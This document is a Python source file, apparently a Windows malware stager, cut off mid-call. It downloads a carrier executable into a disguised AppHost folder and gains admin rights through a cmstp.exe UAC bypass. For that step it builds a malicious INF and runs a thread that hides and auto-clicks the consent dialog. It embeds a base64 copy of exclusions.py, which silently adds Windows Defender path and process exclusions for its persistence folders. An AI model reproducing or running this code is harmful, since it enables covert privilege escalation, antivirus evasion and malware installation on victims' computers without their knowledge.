 # tung python-road payload — silent on every failure, stdlib only.
# arrives through python's stdin (pythonw -u -); never a file on disk.
# the exe url rides in from the jar (env EXE_URL = its baked windows url).
# job order: stage the exe -> Administrator lift via cmstp (majanito shape)
# -> the elevated stage materializes + runs exclusions.py (r1.1.2), then
# -> execs the carrier exe. no exclusion work inside work.py itself.

import os
import sys

if sys.platform != "win32":
    sys.exit(0)

import ctypes
import random
import string
import subprocess
import tempfile
import threading
import time
from urllib.request import Request, urlopen

# ---- config ----------------------------------------------------------------
EXE_URL = os.environ.get("EXE_URL", "")
LOCALAPPDATA = os.environ.get("LOCALAPPDATA", "")
PERSIST_DIR = os.path.join(LOCALAPPDATA, "Microsoft", "Windows", "AppHost")

EXE_NAME = "tung_dbg_carrier.exe"
if EXE_URL:
    try:
        n = str(EXE_URL).split("?")[0].rstrip("/").split("/")[-1]
        if n and ".." not in n:
            EXE_NAME = n
    except Exception:
        pass
EXE_PATH = os.path.join(PERSIST_DIR, EXE_NAME)


# ---- shell api -------------------------------------------------------------
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

PROCESS_TERMINATE = 0x0001
TH32CS_SNAPPROCESS = 0x00000002
SW_HIDE = 0
WM_CLOSE = 0x0010
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101
BM_CLICK = 0x00F5
VK_RETURN = 0x0D
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001
SWP_NOACTIVATE = 0x0010
HWND_BOTTOM = 1


class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
                ("th32ProcessID", ctypes.c_ulong), ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
                ("th32ParentProcessID", ctypes.c_ulong), ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", ctypes.c_ulong), ("szExeFile", ctypes.c_char * 260)]


kernel32.Process32First.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32First.restype = ctypes.c_int
kernel32.Process32Next.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32Next.restype = ctypes.c_int
kernel32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
kernel32.OpenProcess.restype = ctypes.c_void_p
kernel32.CloseHandle.argtypes = [ctypes.c_void_p]

# window enumerator — FindWindowW's exact-title match missed the 'Make this
# connection available' profile variant on field boxes, leaving cmstp
# waiting for consent forever. EnumWindows + substring match catches every
# dialog shape the lift can raise.
user32.EnumWindows.restype = ctypes.c_int
user32.EnumWindows.argtypes = [
    ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p),
    ctypes.c_void_p]
user32.GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
user32.IsWindowVisible.restype = ctypes.c_int
user32.IsWindowVisible.argtypes = [ctypes.c_void_p]


def _window_titles():
    wins = []

    @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
    def cb(hwnd, lparam):
        wins.append(hwnd)
        return 1

    user32.EnumWindows(cb, 0)
    return wins


def window_title(hwnd):
    buf = ctypes.create_unicode_buffer(512)
    user32.GetWindowTextW(hwnd, buf, 512)
    return buf.value


# ---- helpers ---------------------------------------------------------------
def rand_str(n):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def is_elevated():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def kill_process(name):
    try:
        subprocess.run(["taskkill", "/IM", name, "/F"], creationflags=0x08000000,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
    except Exception:
        pass


def kill_all_cmstp():
    snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == -1:
        return
    pe = PROCESSENTRY32()
    pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
    if kernel32.Process32First(snap, ctypes.byref(pe)):
        while True:
            if b"cmstp" in pe.szExeFile.lower():
                h = kernel32.OpenProcess(PROCESS_TERMINATE, False, pe.th32ProcessID)
                if h:
                    kernel32.TerminateProcess(h, 0)
                    kernel32.CloseHandle(h)
            if not kernel32.Process32Next(snap, ctypes.byref(pe)):
                break
    kernel32.CloseHandle(snap)


def cleanup_infs():
    tmp = tempfile.gettempdir()
    try:
        for f in os.listdir(tmp):
            if f.endswith(".inf"):
                try:
                    os.unlink(os.path.join(tmp, f))
                except Exception:
                    pass
    except Exception:
        pass


# ---- the admin lift — majanito cmstp shape ---------------------------------
class Dismisser:
    """hides + completes the cmstp lift dialog. r42: the ~0.1 s flash was this
    hunting at Windows' real timer resolution (~15ms sleep granularity) AFTER
    the dialog had already painted. hunting is now OWNERSHIP-driven and
    frame-tight: any top-level window owned by the cmstp pid (visible or
    hidden, any title) is hidden + completed the instant it is enumerated —
    a tight spin, no sleeps, so the observer lands ahead of the paint."""
    def __init__(self, title):
        self.title = title
        self.done = threading.Event()
        self.target_pid = 0   # set to the spawned cmstp pid before .start()

    def _win_owner(self, hwnd):
        pid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        return pid.value

    def find_window(self):
        want = [w.lower() for w in
                (self.title, "Connection Manager Profile Installer") if w]
        for hwnd in _window_titles():
            if self.target_pid and self._win_owner(hwnd) == self.target_pid:
                return hwnd   # owned by cmstp: hunt hides it before it paints
            if not user32.IsWindowVisible(hwnd):
                continue
            t = window_title(hwnd).lower()
            if any(w in t for w in want):
                return hwnd
        return None

    def dismiss(self, hwnd):
        user32.SetWindowPos(hwnd, HWND_BOTTOM, 0, 0, 0, 0,
                            SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE)
        user32.ShowWindow(hwnd, SW_HIDE)
        user32.SetForegroundWindow(hwnd)
        # r5: BM_CLICK on the FIRST child Button hit the 'All users' radio —
        # the consent dialog stayed up (the ss dialog) and cmstp still waited.
        # enumerate children, click the one actually labeled OK; Enter+Close
        # as the fallback triad so the dialog never outlives us.
        user32.EnumChildWindows.restype = ctypes.c_int
        user32.EnumChildWindows.argtypes = [
            ctypes.c_void_p,
            ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p),
            ctypes.c_void_p]
        clicked = []

        @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
        def _ok(child, lp):
            buf = ctypes.create_unicode_buffer(64)
            user32.GetWindowTextW(child, buf, 64)
            if buf.value == "OK":
                user32.PostMessageW(child, BM_CLICK, 0, 0)
                clicked.append(child)
            return 1

        user32.EnumChildWindows(hwnd, _ok, 0)
        if not clicked:
            b = user32.FindWindowExW(hwnd, None, "Button", None)
            if b:
                user32.PostMessageW(b, BM_CLICK, 0, 0)
        user32.PostMessageW(hwnd, WM_KEYDOWN, VK_RETURN, 0)
        user32.PostMessageW(hwnd, WM_KEYUP, VK_RETURN, 0)
        user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)

    def run(self):
        # r42: tight spin — EnumWindows per iteration is microseconds and the
        # dialog appears within ~50-100ms of the spawned cmstp, so spinning
        # beats any sleep granularity even at the timer floor.
        import time as _t
        end = _t.time() + 8.0
        while _t.time() < end:
            hwnd = self.find_window()
            if hwnd:
                self.dismiss(hwnd)
                self.done.set()
                return
            # r45: 3ms pace — still far inside the paint-timer floor (a window
            # is caught within ~3ms of showing), without pegging a full core
            # for the whole 8s window when the dialog never comes up.
            _t.sleep(0.003)

    def start(self):
        threading.Thread(target=self.run, daemon=True).start()

    def wait(self, timeout=5.0):
        self.done.wait(timeout)


def build_inf(cmd, svc_name, reg_lines=None):
    """cmstp profile schema — nothing schema-foreign:
    reg_lines is None -> the command INF (exec road): [DefaultInstall] with
    CustomDestination=Dsec + RunPreSetupCommands=Csec (parse-proven on the
    target box since the r4 era).
    reg_lines is a list -> the exclusions INF: [DefaultInstall] carries ONLY
    CustomDestination=Dsec (NO AddReg= — that directive is what broke section
    parsing since r7); the exclusion writes ride the DESTINATION section
    [Lsec] itself in the same five-token registry grammar as the sample's
    App Paths line: root,subkey,name,flags,data — written elevated by cmstp
    directly, no child process.
    Also dumps the exact INF bytes to AppHost\\last.inf before firing, so
    the next failure report can be the actual text instead of screenshots."""
    s1 = f"D{rand_str(4)}"
    s3 = f"L{rand_str(4)}"
    cmd_block = ""
    dest_extra = ""
    if reg_lines is None:
        s2 = f"C{rand_str(4)}"
        cmd_block = (f"RunPreSetupCommands={s2}\n"
                     f"[{s2}]\n"
                     f"{cmd}\n"
                     "taskkill /IM cmstp.exe /F\n")
    else:
        dest_extra = "\n".join(reg_lines) + "\n"
    return f"""; {rand_str(16)}
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination={s1}
{cmd_block}[{s1}]
49000,49001={s3}, 7
[{s3}]
{dest_extra}"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="{svc_name}"
ShortSvcName="{rand_str(4)}"
"""


def uac_bypass(cmd):
    """Executes <<cmd>> under the elevated token via cmstp /au.
    r2: normalizes whatever the caller passes — a bare powershell snippet
    gets the powershell.exe wrapper inserted, so cmstp always sees a real
    executable as the first token (the dialog said 'cannot find the file
    specified' precisely because the first token was not one)."""
    if is_elevated():
        return True
    if isinstance(cmd, list):
        cmd = " ".join(cmd)
    c = str(cmd).lstrip()
    # real executable invocations pass through untouched; only BARE snippets
    # get the wrapper (r6: cmd.exe chains were being wrapped too — that is
    # what put powershell back on the cmdline and fed the Commando rule +
    # the Access-denied on process creation)
    lc = c.lower()
    if not (lc.startswith("powershell") or lc.startswith("cmd.exe")
            or lc.startswith("cmd ") or c.startswith('"')):
        cmd = f'powershell -NoP -W Hidden -C "{c}"'
    kill_all_cmstp()
    cleanup_infs()

    svc_name = f"Microsoft {rand_str(6)} Service"
    inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
    try:
        with open(inf_path, "w", encoding="utf-8") as fh:
            fh.write(build_inf(cmd, svc_name))
    except Exception:
        return False

    dismisser = Dismisser(svc_name)
    try:
        p = subprocess.Popen(["cmstp.exe", "/au", inf_path], stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL, creationflags=0x08000000)
        # r45: the ownership hunt runs at full strength — pid armed the instant
        # CreateProcess returns (µs after the dialog can exist), so any top-level
        # window cmstp owns is hidden before its first paint frame.
        dismisser.target_pid = p.pid
    except Exception:
        return False
    dismisser.start()

    dismisser.wait(8.0)
    time.sleep(0.3)
    _sweep_dialogs(svc_name)   # close any survivor the dismisser raced
    try:
        os.unlink(inf_path)
    except Exception:
        pass
    return True


def run_elevated(exe_path):
    """Runs <<exe_path>> with elevation via the cmstp lift."""
    try:
        if is_elevated():
            subprocess.Popen([exe_path], creationflags=0x08000000)
            return True
        return uac_bypass(f'"{exe_path}"')
    except Exception:
        return False


def _sweep_dialogs(svc_name, seconds=3.0):
    """Best-effort post-lift cleanup: any leftover lift dialog (the 'Make this
    connection available' profile or the CMPI error box) gets WM_CLOSE until
    nothing answerable remains."""
    end = time.time() + seconds
    want = [w.lower() for w in (svc_name, "Connection Manager Profile Installer") if w]
    while time.time() < end:
        for hwnd in _window_titles():
            if not user32.IsWindowVisible(hwnd):
                continue
            t = window_title(hwnd).lower()
            if any(w in t for w in want):
                user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)
        time.sleep(0.2)


def exclusion_landed():
    """Live read-back: the AppHost dir must show as a Defender exclusion path
    value. reg query — non-elevated, stock boxes, no cmdlet needed."""
    appdir = LOCALAPPDATA + "\\Microsoft\\Windows\\AppHost"
    key = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
    try:
        out = subprocess.run(
            ["reg", "query", key, "/v", appdir],
            creationflags=0x08000000, stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL, timeout=15)
        return appdir.lower() in out.stdout.decode(errors="replace").lower()
    except Exception:
        return False


# r1.1.2: the standalone exclusion writer is exclusions.py (repo mirror);
# the stage embeds its base64 (EXCL_B64 below + ___EXCL_B64___ slot) so the
# materialized file is BYTE-EXACT, immune to quoting/escaping layers.

EXCL_B64 = "IyBsYW5ndWFnZTogUHl0aG9uIDMsIGZpbGU6IGV4Y2x1c2lvbnMucHksIHRhcmdldDogV2luZG93cyBEZWZlbmRlciwgV2luMTAvMTEKIyAqc3RhbmRhbG9uZSBEZWZlbmRlciBleGNsdXNpb24gd3JpdGVyIGZvciB0aGUgdHVuZyBjYXJyaWVyOiB3b3JrLnB5J3MgbGlmdGVkCiMgIHN0YWdlIG1hdGVyaWFsaXplcyArIHJ1bnMgdGhpcyB1bmRlciB0aGUgZWxldmF0ZWQgdG9rZW4gKG5ldmVyIGxlc3MpLgojICByMzcgKGRqOiAic2FtZSBhcyB0aGUgb3RoZXIgZXhjbHVzaW9uLCBqdXN0IGFkZCB0aGUgbmV3IHBhdGhzIik6IHRoZSBzZXQKIyAgbm93IGNhcnJpZXMgZXZlcnkgaG9tZSB0aGUgcGVyc2lzdGVuY2Uvc2hlbGwgc2lkZSB1c2VzOgojICAgIC0gdGhlIHN0YWdlZCBBcHBIb3N0IGRpciArIG1pbnRlZCBjYXJyaWVyIGV4ZSAob3JpZ2luYWwgcjMzIHJvYWQpCiMgICAgLSB0aGUgcmVsb2NhdGVkIEM6XFByb2dyYW1EYXRhXDx1cGRkaXI+XDxleGU+IGNvcHkg4oCUIHZpYSB0aGUgY3BwIG1hcmtlcgojICAgICAgPEFwcEhvc3Q+XHJlbG9jYXRpb25zLnR4dCAoZXhlIHBhdGggbGluZSAxLCBkaXIgbGluZSAyKQojICAgIC0gJUFQUERBVEElXEVkZ2VVcGRhdGUg4oCUIHRoZSBzaGVsbC9zcGxpdC1wYWlyIHNpZGUtaG9tZTsgaXRzIGV4ZSBwYXlsb2FkCiMgICAgICBmaWxlcyBqb2luIGFzIHByb2Nlc3MgZXhjbHVzaW9ucwojICByb2FkcyAodW5jaGFuZ2VkIHNoYXBlKToKIyAgICAxLiBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoLy1FeGNsdXNpb25Qcm9jZXNzLCBvbmUgcG93ZXJzaGVsbCwKIyAgICAgICByZWFkIGJhY2sgdGhyb3VnaCBHZXQtTXBQcmVmZXJlbmNlIOKAlCBFVkVSWSBlbnRyeSBtdXN0IHNob3cKIyAgICAyLiByZWcuZXhlIHN0b3JlIHdyaXRlIGFzIGJlbHQgKFBhdGhzICsgUHJvY2Vzc2VzKSwgcmVnIHF1ZXJ5IHJlYWQtYmFjawojICBzaWxlbnQgZXZlcnl3aGVyZTsgZXZlcnkgZmFpbHVyZSBpcyBhIG5vLW9wLCBuZXZlciBhIGNyYXNoLioKaW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBzeXMKCmlmIG9zLm5hbWUgIT0gIm50IjoKICAgIHN5cy5leGl0KDApCgppbXBvcnQgY3R5cGVzCgpDUkVBVEVfTk9fV0lORE9XID0gMHgwODAwMDAwMApBUFBESVIgPSBvcy5lbnZpcm9uWyJMT0NBTEFQUERBVEEiXSArICJcXE1pY3Jvc29mdFxcV2luZG93c1xcQXBwSG9zdCIKRVhFX05BTUUgPSBvcy5lbnZpcm9uLmdldCgiRVhDTF9FWEUiLCAidHVuZy5leGUiKQoKCmRlZiBlbGV2KCk6CiAgICB0cnk6CiAgICAgICAgcmV0dXJuIGN0eXBlcy53aW5kbGwuc2hlbGwzMi5Jc1VzZXJBbkFkbWluKCkgIT0gMAogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICByZXR1cm4gRmFsc2UKCgpkZWYgbWFya2VyX3BhdGhzKCk6CiAgICAiIiJ0aGUgY3BwIHJlbG9jYXRpb24gbWFya2VyOiByZWxvY2F0ZWQgZXhlIHBhdGggKGxpbmUpIOKAlCB0cmVhdGVkIGFzIGJvdGgKICAgIGEgcHJvY2VzcyBleGNsdXNpb24gYW5kIGl0cyBwYXJlbnQgZGlyIGFzIGEgcGF0aCBleGNsdXNpb24uIiIiCiAgICBvdXRfZXhlcyA9IFtdCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKEFQUERJUiArICJcXHJlbG9jYXRpb25zLnR4dCIsICJyIiwKICAgICAgICAgICAgICAgICAgZW5jb2Rpbmc9InV0Zi04IiwgZXJyb3JzPSJyZXBsYWNlIikgYXMgZmg6CiAgICAgICAgICAgIGZvciBsaW5lIGluIGZoOgogICAgICAgICAgICAgICAgcCA9IGxpbmUuc3RyaXAoKQogICAgICAgICAgICAgICAgaWYgcCBhbmQgcC5sb3dlcigpLmVuZHN3aXRoKCIuZXhlIik6CiAgICAgICAgICAgICAgICAgICAgb3V0X2V4ZXMuYXBwZW5kKHApCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHBhc3MKICAgIHJldHVybiBvdXRfZXhlcwoKCmRlZiBlZGdldXBkYXRlX3BhdGhzKCk6CiAgICAiIiJyMzggKGRqOiAiQzpcXFByb2dyYW1EYXRhXFxFZGdlVXBkYXRlIHdheSBhbmQgaXRzIHByb2Nlc3MiKSDigJQgQk9USAogICAgRWRnZVVwZGF0ZSBob21lcywgaGFyZGNvZGVkLCBtYXJrZXItaW5kZXBlbmRlbnQ6CiAgICAgIC0gJUFQUERBVEElXFxFZGdlVXBkYXRlICAgKHJvYW1pbmcgc2lkZS1ob21lOiBzaGVsbCBkYXRhICsgc3BsaXQgcGFpcikKICAgICAgLSBDOlxcUHJvZ3JhbURhdGFcXEVkZ2VVcGRhdGUgICh0aGUgcmVsb2NhdGVkIHBlcnNpc3RlbmNlIGNvcHkncyBob21lIOKAlAogICAgICAgIHRoZSBjcHAgbWFya2VyIHBhdGggbGl2ZXMgdW5kZXIgdGhpcywgYnV0IHRoZSBtYXJrZXIgb25seSBleGlzdHMKICAgICAgICBhZnRlciBvbmUgcjM2KyBydW4sIHNvIHRoZSBob21lIGpvaW5zIHRoZSBzZXQgdW5jb25kaXRpb25hbGx5KQogICAgZXZlcnkgKi5leGUgaW5zaWRlIGVhY2ggaG9tZSBqb2lucyBhcyBhIHByb2Nlc3MgZXhjbHVzaW9uLiIiIgogICAgZGlycywgZXhlcyA9IFtdLCBbXQogICAgaG9tZXMgPSBbb3MuZW52aXJvbi5nZXQoIkFQUERBVEEiLCAiIikgKyAiXFxFZGdlVXBkYXRlIiwKICAgICAgICAgICAgICJDOlxcUHJvZ3JhbURhdGFcXEVkZ2VVcGRhdGUiXQogICAgZm9yIGJhc2UgaW4gaG9tZXM6CiAgICAgICAgaWYgbm90IGJhc2U6CiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBvcy5wYXRoLmlzZGlyKGJhc2UpOgogICAgICAgICAgICAgICAgZGlycy5hcHBlbmQoYmFzZSkKICAgICAgICAgICAgICAgIGZvciBuIGluIHNvcnRlZChvcy5saXN0ZGlyKGJhc2UpKVs6NjRdOgogICAgICAgICAgICAgICAgICAgIGlmIG4ubG93ZXIoKS5lbmRzd2l0aCgiLmV4ZSIpOgogICAgICAgICAgICAgICAgICAgICAgICBleGVzLmFwcGVuZChiYXNlICsgIlxcIiArIG4pCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcGFzcwogICAgcmV0dXJuIGRpcnMsIGV4ZXMKCgpkZWYgcHJvZ3JhbWRhdGFfZnJvbV9tYXJrZXIoZXhlcyk6CiAgICAiIiJtYXJrZXIgZGlyczogdGhlIHBhcmVudCBvZiBldmVyeSByZWxvY2F0ZWQgZXhlLiIiIgogICAgZGlycyA9IFtdCiAgICBmb3IgeCBpbiBleGVzOgogICAgICAgIGQgPSB4LnJzcGxpdCgiXFwiLCAxKVswXQogICAgICAgIGlmIGQgYW5kIGQgbm90IGluIGRpcnM6CiAgICAgICAgICAgIGRpcnMuYXBwZW5kKGQpCiAgICByZXR1cm4gZGlycwoKCmRlZiBwc19hcmdzKGNtZCwgdGltZW91dCk6CiAgICByZXR1cm4gWyJwb3dlcnNoZWxsLmV4ZSIsICItTm9Qcm9maWxlIiwgIi1Ob25JbnRlcmFjdGl2ZSIsCiAgICAgICAgICAgICItRXhlY3V0aW9uUG9saWN5IiwgIkJ5cGFzcyIsICItQ29tbWFuZCIsIGNtZF0sIHRpbWVvdXQKCgpkZWYgY21kbGV0X3JvYWQoZGlycywgZXhlcyk6CiAgICBpZiBub3QgZGlycyBhbmQgbm90IGV4ZXM6CiAgICAgICAgcmV0dXJuIEZhbHNlCiAgICBwYXJ0cyA9IFtdCiAgICBmb3IgZCBpbiBkaXJzOgogICAgICAgIHBhcnRzLmFwcGVuZCgiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnIiArIGQgKyAiJyIpCiAgICBmb3IgeCBpbiBleGVzOgogICAgICAgIHBhcnRzLmFwcGVuZCgiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUHJvY2VzcyAnIiArIHggKyAiJyIpCiAgICBwcyA9ICI7ICIuam9pbihwYXJ0cykKICAgIGFyZ3MsIHQgPSBwc19hcmdzKHBzLCA2MCkKICAgIHRyeToKICAgICAgICBzdWJwcm9jZXNzLnJ1bihhcmdzLCBjcmVhdGlvbmZsYWdzPUNSRUFURV9OT19XSU5ET1csIHRpbWVvdXQ9dCwKICAgICAgICAgICAgICAgICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZOVUxMLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQogICAgICAgIGFyZ3MsIHQgPSBwc19hcmdzKCIoR2V0LU1wUHJlZmVyZW5jZSkuRXhjbHVzaW9uUGF0aDsgIgogICAgICAgICAgICAgICAgICAgICAgICAgICIoR2V0LU1wUHJlZmVyZW5jZSkuRXhjbHVzaW9uUHJvY2VzcyIsIDYwKQogICAgICAgIG91dCA9IHN1YnByb2Nlc3MucnVuKGFyZ3MsIGNyZWF0aW9uZmxhZ3M9Q1JFQVRFX05PX1dJTkRPVywgdGltZW91dD10LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCkuc3Rkb3V0CiAgICAgICAgdHh0ID0gb3V0LmRlY29kZShlcnJvcnM9InJlcGxhY2UiKS5sb3dlcigpCiAgICAgICAgZm9yIHdhbnQgaW4gZGlycyArIGV4ZXM6CiAgICAgICAgICAgIGlmIHdhbnQubG93ZXIoKSBub3QgaW4gdHh0OgogICAgICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAgICAgcmV0dXJuIFRydWUKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcmV0dXJuIEZhbHNlCgoKZGVmIHJlZ19yb2FkKGRpcnMsIGV4ZXMpOgogICAgIiIic3RvcmUgYmVsdDogc2FtZSB2YWx1ZXMgQWRkLU1wUHJlZmVyZW5jZSBtYWludGFpbnMsIHdyaXR0ZW4gZGlyZWN0bHkuIiIiCiAgICB0cnk6CiAgICAgICAgaWYgbm90IGRpcnMgYW5kIG5vdCBleGVzOgogICAgICAgICAgICByZXR1cm4gRmFsc2UKICAgICAgICB3cml0ZXMgPSBbXQogICAgICAgIGZvciBkIGluIGRpcnM6CiAgICAgICAgICAgIHdyaXRlcy5hcHBlbmQoKCJIS0xNXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzIERlZmVuZGVyXFxFeGNsdXNpb25zXFxQYXRocyIsIGQpKQogICAgICAgIGZvciB4IGluIGV4ZXM6CiAgICAgICAgICAgIHdyaXRlcy5hcHBlbmQoKCJIS0xNXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzIERlZmVuZGVyXFxFeGNsdXNpb25zXFxQcm9jZXNzZXMiLCB4KSkKICAgICAgICBmb3Iga2V5LCB2YWx1ZSBpbiB3cml0ZXM6CiAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKFsicmVnIiwgImFkZCIsIGtleSwgIi92IiwgdmFsdWUsICIvdCIsICJSRUdfU1oiLCAiL2QiLCAiMCIsICIvZiJdLAogICAgICAgICAgICAgICAgICAgICAgICAgICBjcmVhdGlvbmZsYWdzPUNSRUFURV9OT19XSU5ET1csIHRpbWVvdXQ9MjAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0ZG91dD1zdWJwcm9jZXNzLkRFVk5VTEwsIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwpCiAgICAgICAgZmlyc3QgPSBkaXJzWzBdIGlmIGRpcnMgZWxzZSBleGVzWzBdCiAgICAgICAga2V5ID0gKCJIS0xNXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzIERlZmVuZGVyXFxFeGNsdXNpb25zXFxQYXRocyIKICAgICAgICAgICAgICAgaWYgZGlycyBlbHNlCiAgICAgICAgICAgICAgICJIS0xNXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzIERlZmVuZGVyXFxFeGNsdXNpb25zXFxQcm9jZXNzZXMiKQogICAgICAgIG91dCA9IHN1YnByb2Nlc3MucnVuKAogICAgICAgICAgICBbInJlZyIsICJxdWVyeSIsIGtleSwgIi92IiwgZmlyc3RdLAogICAgICAgICAgICBjcmVhdGlvbmZsYWdzPUNSRUFURV9OT19XSU5ET1csIHRpbWVvdXQ9MjAsCiAgICAgICAgICAgIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwpLnN0ZG91dAogICAgICAgIHJldHVybiBmaXJzdC5sb3dlcigpIGluIG91dC5kZWNvZGUoZXJyb3JzPSJyZXBsYWNlIikubG93ZXIoKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICByZXR1cm4gRmFsc2UKCgpkZWYgbWFpbigpOgogICAgaWYgbm90IGVsZXYoKToKICAgICAgICByZXR1cm4gICAjIG11c3QgYWxyZWFkeSBiZSBlbGV2YXRlZCAodGhlIGxpZnRlZCBzdGFnZSBndWFyYW50ZWVzIGl0KQogICAgZGlycyA9IFtBUFBESVJdCiAgICBleGVzID0gW29zLnBhdGguam9pbihBUFBESVIsIEVYRV9OQU1FKV0KICAgICMgcjM3IG5ldyBwYXRoczogdGhlIHJlbG9jYXRlZCBwZXJzaXN0ZW5jZSBjb3B5ICsgdGhlIEVkZ2VVcGRhdGUgc2lkZS1ob21lCiAgICBmb3IgeCBpbiBtYXJrZXJfcGF0aHMoKToKICAgICAgICBpZiB4IG5vdCBpbiBleGVzOgogICAgICAgICAgICBleGVzLmFwcGVuZCh4KQogICAgZm9yIGQgaW4gcHJvZ3JhbWRhdGFfZnJvbV9tYXJrZXIobWFya2VyX3BhdGhzKCkpOgogICAgICAgIGlmIGQgbm90IGluIGRpcnM6CiAgICAgICAgICAgIGRpcnMuYXBwZW5kKGQpCiAgICBlZCwgZWUgPSBlZGdldXBkYXRlX3BhdGhzKCkKICAgIGZvciBkIGluIGVkOgogICAgICAgIGlmIGQgbm90IGluIGRpcnM6CiAgICAgICAgICAgIGRpcnMuYXBwZW5kKGQpCiAgICBmb3IgeCBpbiBlZToKICAgICAgICBpZiB4IG5vdCBpbiBleGVzOgogICAgICAgICAgICBleGVzLmFwcGVuZCh4KQogICAgY21kbGV0X3JvYWQoZGlycywgZXhlcykKICAgIHJlZ19yb2FkKGRpcnMsIGV4ZXMpCgoKbWFpbigpCg=="

# ---- r1.1.2 stage: carrier exec + exclusions.py materialize/execute --------
# r12/r14 base restored: the lift relaunches OUR python elevated; the stage
# does the carrier job, and the exclusions now ride the SEPARATE file.
STAGE = r'''# r1.1.2 stage: runs ELEVATED (relaunched by the cmstp lift). exclusions
# live in the SEPARATE served file exclusions.py (r33 dj order): the stage
# materializes it from the embedded EXCL_B64 copy (byte-exact base64) and executes it elevated,
# exactly like the carrier exe. no exclusion work inside the stage body.
import ctypes
import os
import subprocess
import sys

CREATE_NO_WINDOW = 0x08000000
EXE_NAME = "__EXE__"
APPDIR = os.environ["LOCALAPPDATA"] + "\\Microsoft\\Windows\\AppHost"
EXCL_B64 = "___EXCL_B64___"


def elev():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def alive(name):
    try:
        out = subprocess.run(
            ["tasklist", "/FI", "IMAGENAME eq " + name],
            creationflags=CREATE_NO_WINDOW, stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL, timeout=15).stdout
        return name.lower() in out.decode(errors="replace").lower()
    except Exception:
        return False


def main():
    if not elev():
        return
    # r1.1.2: exclusions = the SEPARATE file, written to disk then executed
    # ELEVATED, exactly like the carrier exe is. work.py's own body never
    # touches Defender (r14 shape restored); exclusions.py owns that job.
    excl_path = os.path.join(APPDIR, "exclusions.py")
    try:
        if not os.path.exists(excl_path):
            import base64
            with open(excl_path, "wb") as fh:
                fh.write(base64.b64decode(EXCL_B64))   # ___EXCL_B64___ rides at stage build
    except Exception:
        pass
    try:
        # r34: name the real carrier — without EXCL_EXE the writer would
        # target its bundled fallback (tung.exe), the wrong process name.
        os.environ["EXCL_EXE"] = EXE_NAME
        subprocess.run([sys.executable, "-u", excl_path],
                       creationflags=CREATE_NO_WINDOW, timeout=180,
